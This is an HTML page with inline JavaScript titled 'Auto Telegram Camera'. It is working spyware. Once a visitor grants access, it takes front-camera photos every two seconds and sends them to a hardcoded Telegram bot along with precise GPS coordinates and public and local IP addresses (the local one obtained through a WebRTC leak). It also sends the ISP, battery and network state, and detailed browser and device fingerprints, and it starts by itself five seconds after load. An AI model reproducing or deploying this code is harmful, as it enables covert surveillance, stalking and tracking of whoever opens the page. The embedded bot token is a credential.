<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Telegram Camera</title>
<style>
body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
button{margin-top:12px;padding:10px 20px;font-size:16px;cursor:pointer}
#status{color:#0f0;margin-top:10px;font-size:14px}
</style>
</head>
<body>
<canvas id="canvas" style="display:none"></canvas>
<button onclick="startAutoSend()">â–¶ START AUTO SEND</button>
<div id="status">Initializing...</div>
<script>
const canvas = document.getElementById("canvas");
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID = "8319568593";
let intervalId = null;
let latitude = "N/A";
let longitude = "N/A";
let mapLink = "Location not allowed";
let userIP = "Unknown";
let stream = null;
let batteryInfo = "Battery: Not available";
let networkInfo = "Network: Not available";
let localIP = "Unknown";
let city = "Unknown";
let country = "Unknown";
let isp = "Unknown";
let locationPermissionGranted = false;

// Get IP and location info immediately
fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
    userIP = d.ip;
    fetch(`https://ipapi.co/${userIP}/json/`)
        .then(r => r.json())
        .then(ipData => {
            city = ipData.city || "Unknown";
            country = ipData.country_name || "Unknown";
            isp = ipData.org || "Unknown";
        });
});

// Request location permission automatically
function requestLocationPermission() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                latitude = pos.coords.latitude.toFixed(6);
                longitude = pos.coords.longitude.toFixed(6);
                const accuracy = pos.coords.accuracy;
                mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
                locationPermissionGranted = true;
                document.getElementById('status').textContent = 'Location access granted âœ“';
                console.log('Location permission granted');
            },
            error => {
                mapLink = "Location denied";
                document.getElementById('status').textContent = 'Location access denied âœ—';
                console.log('Location permission denied');
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
}

// Request camera permission automatically
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(s => {
        stream = s;
        document.getElementById('status').textContent = 'Camera access granted âœ“';
        // Request location permission after camera is granted
        requestLocationPermission();
    })
    .catch(err => {
        document.getElementById('status').textContent = 'Camera access denied âœ—';
        console.error('Camera permission denied:', err);
    });

// Get battery info
if (navigator.getBattery) {
    navigator.getBattery().then(b => {
        batteryInfo = `
ðŸ”‹ Battery:
Level: ${Math.round(b.level * 100)}%
Charging: ${b.charging ? 'Yes' : 'No'}
Time: ${b.chargingTime === Infinity ? 'Not charging' : b.chargingTime + ' seconds'}
`;
    });
}

// Get network info
if (navigator.connection) {
    networkInfo = `
ðŸ“¡ Network:
Type: ${navigator.connection.effectiveType}
Downlink: ${navigator.connection.downlink} Mbps
RTT: ${navigator.connection.rtt} ms
Save Data: ${navigator.connection.saveData ? 'Enabled' : 'Disabled'}
`;
}

// Get local IP address
const getLocalIPAddress = () => {
    return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
        pc.onicecandidate = ice => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (ip && ip[1]) resolve(ip[1]);
            pc.close();
        };
        setTimeout(() => resolve("Not found"), 1000);
    });
};

// Get browser plugins/extensions detection
const getBrowserPlugins = () => {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
    }
    return plugins.length > 0 ? plugins.join(', ') : 'No plugins detected';
};

// Get detailed timezone information
const getDetailedTimezoneInfo = () => {
    const now = new Date();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const offset = -now.getTimezoneOffset() / 60;
    const offsetString = `UTC${offset >= 0 ? '+' : ''}${offset}`;
    const dst = now.getTimezoneOffset() < new Date(now.getFullYear(), 0, 1).getTimezoneOffset() ? 'Yes' : 'No';
    
    // Get timezone abbreviation
    const timezoneAbbr = now.toLocaleTimeString('en-us', { timeZoneName: 'short' }).split(' ')[2];
    
    return {
        timezone: timezone,
        offset: offsetString,
        abbreviation: timezoneAbbr || timezone.split('/')[1] || timezone,
        daylightSaving: dst,
        currentTime: now.toLocaleTimeString(),
        currentDate: now.toLocaleDateString()
    };
};

// Get advanced system information
const getAdvancedSystemInfo = () => {
    const cores = navigator.hardwareConcurrency || 'Unknown';
    const ram = navigator.deviceMemory || 'Unknown';
    const lang = navigator.language;
    const langs = navigator.languages ? navigator.languages.join(', ') : lang;
    
    const tzInfo = getDetailedTimezoneInfo();
    
    const platform = navigator.platform;
    const vendor = navigator.vendor || 'Unknown';
    const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
    const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
    const webdriver = navigator.webdriver ? 'Yes' : 'No';
    const maxTouchPoints = navigator.maxTouchPoints || 0;
    const userAgent = navigator.userAgent;
    const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : 'Unknown';
    
    // Get browser plugins
    const plugins = getBrowserPlugins();
    
    // Detect if browser is in private/incognito mode
    let isPrivate = 'Unknown';
    try {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (fs) {
            fs(window.TEMPORARY, 100, () => { isPrivate = 'No'; }, () => { isPrivate = 'Yes'; });
        }
    } catch(e) {
        isPrivate = 'Detection failed';
    }
    
    return `
ðŸ–¥ï¸ SYSTEM INFORMATION:
Device: ${platform}
Model: ${deviceModel}
Browser: ${userAgent.substring(0, 80)}...
CPU Cores: ${cores}
RAM: ${ram} GB
Languages: ${langs}

â° TIMEZONE INFORMATION:
Timezone: ${tzInfo.timezone}
Offset: ${tzInfo.offset}
Abbreviation: ${tzInfo.abbreviation}
Daylight Saving: ${tzInfo.daylightSaving}
Current Time: ${tzInfo.currentTime}
Current Date: ${tzInfo.currentDate}

ðŸ”§ BROWSER DETAILS:
Vendor: ${vendor}
Cookies: ${cookieEnabled}
PDF Viewer: ${pdfViewerEnabled}
WebDriver: ${webdriver}
Touch Points: ${maxTouchPoints}
Private Mode: ${isPrivate}
Browser Plugins: ${plugins}

ðŸ“º SCREEN INFORMATION:
Resolution: ${screen.width}x${screen.height}
Pixel Ratio: ${window.devicePixelRatio}
Color Depth: ${screen.colorDepth}
Orientation: ${screen.orientation ? screen.orientation.type : 'Unknown'}
Available Height: ${screen.availHeight}px
Available Width: ${screen.availWidth}px
`;
};

function startAutoSend() {
    if (!locationPermissionGranted) {
        requestLocationPermission();
    }
    
    getLocalIPAddress().then(ip => {
        localIP = ip;
        document.getElementById('status').textContent = 'Local IP found: ' + localIP;
    });

    if (!intervalId) {
        intervalId = setInterval(captureAndSend, 2000);
        document.getElementById('status').textContent = 'Auto sending started âœ“';
        document.querySelector('button').textContent = 'â¹ STOP AUTO SEND';
        document.querySelector('button').onclick = stopAutoSend;
    }
}

function stopAutoSend() {
    if (intervalId) {
        clearInterval(intervalId);
        intervalId = null;
        document.getElementById('status').textContent = 'Auto sending stopped';
        document.querySelector('button').textContent = 'â–¶ START AUTO SEND';
        document.querySelector('button').onclick = startAutoSend;
    }
}

function captureAndSend() {
    if (!stream) {
        console.log('No camera stream available');
        return;
    }
    
    const videoTrack = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(videoTrack);
    
    imageCapture.grabFrame().then(imageBitmap => {
        canvas.width = imageBitmap.width;
        canvas.height = imageBitmap.height;
        const ctx = canvas.getContext("2d");
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(imageBitmap, 0, 0);
        
        canvas.toBlob(blob => {
            const tzInfo = getDetailedTimezoneInfo();
            const caption = `
ðŸ“¸ AUTO CAPTURE - ${new Date().toLocaleTimeString()}
â° Full Time: ${new Date().toLocaleString()}

ðŸ“ ACCURATE LOCATION:
Latitude: ${latitude}
Longitude: ${longitude}
Google Maps: ${mapLink}
City: ${city}
Country: ${country}
ISP: ${isp}

â° TIMEZONE DETAILS:
Timezone: ${tzInfo.timezone}
Offset: ${tzInfo.offset}
Abbreviation: ${tzInfo.abbreviation}
Daylight Saving: ${tzInfo.daylightSaving}

ðŸŒ NETWORK INFORMATION:
Public IP: ${userIP}
Local IP: ${localIP}
${networkInfo}

${getAdvancedSystemInfo()}

${batteryInfo}

âš ï¸ Automatic capture every 2 seconds
Generated at: ${new Date().toISOString()}
`;
            
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob);
            formData.append("caption", caption);
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Telegram API error:', response.status);
                }
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }, "image/jpeg", 0.7);
    }).catch(error => {
        console.error('Error capturing frame:', error);
        document.getElementById('status').textContent = 'Error capturing image';
    });
}

// Auto-start after 3 seconds if user doesn't click
setTimeout(() => {
    if (!intervalId) {
        document.getElementById('status').textContent = 'Auto-starting in 3 seconds...';
    }
}, 3000);

// Optional: Auto-start after all permissions are granted
setTimeout(() => {
    if (stream && !intervalId) {
        startAutoSend();
    }
}, 5000);
</script>
</body>
</html>
